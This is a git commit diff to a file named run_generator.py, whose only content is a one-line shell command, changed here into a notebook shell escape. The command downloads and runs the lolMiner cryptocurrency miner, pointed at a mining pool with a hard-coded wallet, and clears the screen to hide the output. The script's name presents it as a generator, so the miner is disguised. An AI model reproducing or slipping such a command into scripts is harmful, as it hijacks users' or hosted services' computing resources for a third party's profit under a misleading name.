9eab53cbad5f5af89c6b09d744cd960fd87135e4
vdtyuio <92265801+vdtyuio@users.noreply.github.com>
2021-10-19 21:52:27 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool clo.2miners.com:3030 --user CLO:0xF138c5Fe14FF6B431D6D1767c986587A0cbc0bD1.CR7#evxt-vx98 --ethstratum ETHPROXY
+! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool clo.2miners.com:3030 --user CLO:0xF138c5Fe14FF6B431D6D1767c986587A0cbc0bD1.CR7#evxt-vx98 --ethstratum ETHPROXY
             
